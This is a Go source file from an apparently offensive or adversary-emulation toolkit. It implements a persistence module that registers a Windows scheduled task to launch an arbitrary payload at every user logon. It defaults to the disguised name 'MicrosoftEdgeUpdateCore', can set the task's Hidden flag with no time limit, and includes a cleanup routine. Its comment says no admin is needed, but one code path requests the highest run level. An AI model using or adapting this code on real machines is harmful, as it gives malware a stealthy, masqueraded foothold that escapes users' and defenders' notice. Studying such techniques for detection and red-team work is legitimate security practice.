package persistence

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
)

// SchTask creates a Windows scheduled task that runs at user logon.
// MITRE T1053.005.  No admin required for HKCU-scoped tasks.
type SchTask struct {
	TaskName    string // default: "MicrosoftEdgeUpdateCore"
	PayloadPath string // required
	UseXML      bool   // if true, register via XML (hidden flag, full control)
	Delay       string // schtasks /DELAY value, default: "0000:30"
}

func (t *SchTask) Name() string  { return "scheduled-task" }
func (t *SchTask) MITRE() string { return "T1053.005" }

func (t *SchTask) taskName() string {
	if t.TaskName == "" {
		return "MicrosoftEdgeUpdateCore"
	}
	return t.TaskName
}

func (t *SchTask) delay() string {
	if t.Delay == "" {
		return "0000:30"
	}
	return t.Delay
}

func (t *SchTask) Run() error {
	if t.PayloadPath == "" {
		return fmt.Errorf("PayloadPath is required")
	}
	if t.UseXML {
		return t.runXML()
	}
	return t.runWrapper()
}

func (t *SchTask) runWrapper() error {
	out, err := exec.Command("schtasks.exe",
		"/Create", "/F",
		"/TN", t.taskName(),
		"/TR", t.PayloadPath,
		"/SC", "ONLOGON",
		"/DELAY", t.delay(),
		"/RL", "HIGHEST",
	).CombinedOutput()
	if err != nil {
		return fmt.Errorf("schtasks: %w\n%s", err, out)
	}
	return nil
}

func (t *SchTask) runXML() error {
	body := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled><Delay>PT30S</Delay></LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <Hidden>true</Hidden>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
  </Settings>
  <Actions>
    <Exec><Command>%s</Command></Exec>
  </Actions>
</Task>`, xmlEscape(t.PayloadPath))

	tmp, err := os.CreateTemp("", "task*.xml")
	if err != nil {
		return err
	}
	defer os.Remove(tmp.Name())
	if _, err := tmp.WriteString(body); err != nil {
		return err
	}
	tmp.Close()

	out, err := exec.Command("schtasks.exe",
		"/Create", "/F",
		"/TN", t.taskName(),
		"/XML", tmp.Name(),
	).CombinedOutput()
	if err != nil {
		return fmt.Errorf("schtasks /XML: %w\n%s", err, out)
	}
	return nil
}

func (t *SchTask) Cleanup() error {
	out, err := exec.Command("schtasks.exe", "/Delete", "/F", "/TN", t.taskName()).CombinedOutput()
	if err != nil && !strings.Contains(string(out), "cannot find the file") {
		return fmt.Errorf("schtasks delete: %w\n%s", err, out)
	}
	return nil
}

func xmlEscape(s string) string {
	s = strings.ReplaceAll(s, "&", "&amp;")
	s = strings.ReplaceAll(s, "<", "&lt;")
	s = strings.ReplaceAll(s, ">", "&gt;")
	return s
}
